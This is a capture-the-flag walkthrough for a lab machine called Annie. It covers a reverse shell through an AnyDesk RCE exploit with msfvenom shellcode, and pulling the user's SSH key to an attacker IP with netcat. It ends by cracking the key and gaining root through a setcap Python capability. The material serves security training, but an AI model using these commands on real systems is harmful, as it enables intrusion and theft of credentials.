# Annie - Medium

* Add ```annie.thm``` to ```/etc/hosts``` and start scan - ```nmap -T4 -p- -A -Pn -v annie.thm```:

  * 22/tcp - ssh - OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
  * 7070/tcp - ssl/realserver

* When we visit <https://annie.thm:7070>, we get the error "SSL_ERROR_HANDSHAKE_FAILURE_ALERT"

* On further googling, we can see that port 7070 is running RealServer; in certain cases, it also mentions AnyDesk

* Since the room description does mention remote access, it could possibly be AnyDesk on port 7070

* We can install AnyDesk on our attacker box:

  ```sh
  sudo apt update

  sudo apt install -y gnupg2

  sudo sh -c 'echo "deb http://deb.anydesk.com/ all main" >/etc/apt/sources.list.d/anydesk.list'

  wget -qO - https://keys.anydesk.com/repos/DEB-GPG-KEY | sudo apt-key add -

  sudo apt -y update && sudo apt -y install anydesk
  # we get a dependency error here

  sudo apt -f install
  # problem still not fixed

  wget http://ftp.de.debian.org/debian/pool/main/g/gtkglext/libgtkglext1_1.2.0-11_amd64.deb

  sudo dpkg -i libgtkglext1_1.2.0-11_amd64.deb

  sudo apt -y install anydesk
  # installed

  anydesk
  ```

* We can try connecting to the target IP from AnyDesk but it does not work

* There is an [RCE exploit for AnyDesk 5.5.2](https://www.exploit-db.com/exploits/49613) - we can give this a try before moving forward:

  ```sh
  # according to the exploit, generate shellcode first
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.14.60.78 LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode

  # edit the exploit script
  vim 49613.py
  # add the shellcode here

  # setup listener
  nc -nvlp 4444

  # execute script
  python 49613.py
  # this does not work

  python2 49613.py
  # this works
  # we get reverse shell

  whoami
  # annie

  # upgrade to stable shell
  which python3

  python3 -c 'import pty;pty.spawn("/bin/bash")'

  export TERM=xterm
  # Ctrl+Z

  stty raw -echo; fg
  # press Enter key twice

  pwd
  /home/annie

  ls -la
  # enumerate

  cat user.txt
  # get user flag

  # we can attempt basic enumeration using linpeas

  cd /tmp

  # fetch linpeas.sh from attacker machine hosting files
  wget http://10.14.60.78:8000/linpeas.sh

  chmod +x linpeas.sh

  ./linpeas.sh
  # this shows an unknown SUID binary
  ```

* We can also fetch the user's SSH key:

  ```sh
  # in reverse shell
  cd /home/annie/.ssh

  ls -la
  # we have id_rsa

  # in attacker machine
  nc -nvlp 5555 > id_rsa

  # in reverse shell
  /bin/nc 10.14.60.78 5555 -w 3 < id_rsa

  # in attacker machine
  # we can try to crack the key

  chmod 600 id_rsa

  ssh2john id_rsa > hash_id_rsa

  john --wordlist=/usr/share/wordlists/rockyou.txt hash_id_rsa
  # this gives us the passphrase "annie123"
  ```

* We can now login as 'annie' via SSH:

  ```sh
  ssh annie@annie.thm -i id_rsa
  # use the cracked passphrase
  ```

* From ```linpeas.sh``` enumeration, we found an unknown SUID binary ```/sbin/setcap``` - this seems to be related to capabilities, for which we have exploits on [GTFOBins](https://gtfobins.github.io/gtfobins):

  ```sh
  ls -la /sbin/setcap

  /sbin/setcap

  strings -n 6 /sbin/setcap | less
  # it does mention capabilities

  # we can check Python capabilities exploit

  cp $(which python3) .
  # since we have python3 instead of python

  /sbin/setcap cap_setuid+ep python3

  ./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
  # this gives us root shell
  # we can get root flag
  ```
